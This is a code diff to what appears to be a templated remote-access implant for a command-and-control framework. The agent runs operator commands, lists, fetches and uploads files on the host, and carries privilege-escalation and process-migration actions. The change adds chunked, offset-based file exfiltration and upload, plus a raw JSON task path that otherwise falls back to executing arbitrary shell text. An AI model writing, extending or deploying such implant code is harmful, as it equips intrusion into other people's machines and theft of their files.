@@ -925,21 +925,35 @@ def mod_fs_list(path: str = ".") -> list:
     except Exception as e:
         return [{"error": str(e)}]
 
-def mod_fs_get(remote_path: str) -> bytes:
-    try:
-        with open(remote_path, "rb") as f:
-            return f.read()
-    except Exception as e:
-        return _enc(str(e))
+def mod_fs_get(remote_path: str, offset: int = 0, length: int = 0) -> bytes:
+    """Read up to *length* bytes from *offset*; length 0 means the whole rest.
 
-def mod_fs_put(remote_path: str, data: bytes) -> dict:
+    Raises rather than returning text: a caller cannot tell an unreadable file
+    apart from a file whose contents happen to look like an error.
+    """
+    with open(remote_path, "rb") as f:
+        if offset:
+            f.seek(offset)
+        return f.read(length) if length else f.read()
+
+def mod_fs_size(path: str) -> int:
+    return _o.path.getsize(path)
+
+def mod_fs_put(remote_path: str, data: bytes, offset: int = 0) -> dict:
+    """Write *data* at *offset*, creating parents — offsets let a large upload
+    arrive as a sequence of small messages instead of one giant one."""
     try:
         d = _o.path.dirname(remote_path)
         if d:
             _o.makedirs(d, exist_ok=True)
-        with open(remote_path, "wb") as f:
-            f.write(data)
-        return {"ok": True, "path": remote_path}
+        if offset:
+            with open(remote_path, "r+b") as f:
+                f.seek(offset)
+                f.write(data)
+        else:
+            with open(remote_path, "wb") as f:
+                f.write(data)
+        return {"ok": True, "path": remote_path, "offset": offset, "written": len(data)}
     except Exception as e:
         return {"ok": False, "error": str(e)}
 {% endif %}
@@ -1296,10 +1310,26 @@ def _dispatch(task: dict) -> dict:
     if action == "fs_list":
         return mod_fs_list(task.get("path", "."))
     if action == "fs_get":
-        return {"data": _b64e(mod_fs_get(task.get("path", ""))).decode()}
+        # Chunked on purpose: a whole file in one reply would be a JSON string
+        # of its base64 size, held in memory on both ends.
+        path = task.get("path", "")
+        offset = int(task.get("offset") or 0)
+        length = int(task.get("length") or 0)
+        try:
+            size = mod_fs_size(path)
+            data = mod_fs_get(path, offset, length)
+        except OSError as e:
+            return {"error": str(e)}
+        return {
+            "size": size,
+            "offset": offset,
+            "length": len(data),
+            "eof": size >= 0 and offset + len(data) >= size,
+            "data": _b64e(data).decode(),
+        }
     if action == "fs_put":
         raw = _b64d(task.get("data", ""))
-        return mod_fs_put(task.get("path", ""), raw)
+        return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
     {% endif %}
     {% if include_privesc %}
     if action == "privesc_check":
@@ -1394,6 +1424,16 @@ def _run_command(text: str) -> str:
         return str(result)
 
 def _parse_command(text: str) -> dict:
+    # A line that is already a JSON task bypasses the vocabulary: file transfer
+    # needs arguments (offset, base64 data) that do not survive being typed.
+    if text.startswith("{"):
+        try:
+            task = _j.loads(text)
+        except ValueError:
+            return {"action": "exec", "command": text}
+        if isinstance(task, dict) and task.get("action"):
+            return task
+        return {"action": "exec", "command": text}
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
     if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
@@ -1405,7 +1445,17 @@ def _parse_command(text: str) -> dict:
     if v == "fs_list":
         return {"action": "fs_list", "path": arg or "."}
     if v == "fs_get":
-        return {"action": "fs_get", "path": arg}
+        parts = _sh.split(arg) if arg else []
+        return {"action": "fs_get", "path": parts[0] if parts else "",
+                "offset": int(parts[1]) if len(parts) > 1 else 0,
+                "length": int(parts[2]) if len(parts) > 2 else 0}
+    if v == "fs_put":
+        # fs_put "<path>" <offset> <base64>
+        parts = _sh.split(arg) if arg else []
+        data = parts[-1] if parts else ""
+        return {"action": "fs_put", "path": parts[0] if parts else "",
+                "offset": int(parts[1]) if len(parts) > 2 else 0,
+                "data": data}
     if v == "migrate":
         return {"action": "migrate", "target": arg}
     return {"action": "exec", "command": text}
